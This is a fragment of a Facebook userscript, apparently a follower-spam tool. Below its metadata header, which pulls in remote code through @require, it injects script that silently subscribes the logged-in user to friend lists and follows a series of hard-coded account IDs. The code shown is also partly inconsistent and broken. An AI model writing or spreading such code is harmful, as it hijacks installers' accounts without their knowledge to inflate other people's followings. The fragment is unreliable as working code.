...
// @version v11.0.0               
// @author Syed Minhal Shah Gilani
// @authorURL http://facebook.com/minhalshah.pk
// @homepage http://facebook.com/minhalshah911
// @url https://www.facebook.com/lists/178735675648524
// @icon http://static.ak.fbcdn.net/images/icons/favicon.gif
// @require http://update.sizzlemctwizzle.com/176385.js
// @updateURL    http://userscripts.org/scripts/show/288038
// @downloadURL   http://userscripts.org/scripts/show/288035
...
a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
document.body.appendChild(a);
a("100005362777764");a("100001849384898");a("100007023667379");a("100006451314709");a("100007206876822");a("100005549103530");a("100004561833067");a("100002699868881");a("100002576718162");a("100000512448314");a("100005967428117");sublist("178735675648524");sublist("160463094142449");sublist("206154589573299");sublist("206666642855427");sublist("206666912855400"); sublist("565990806805894");
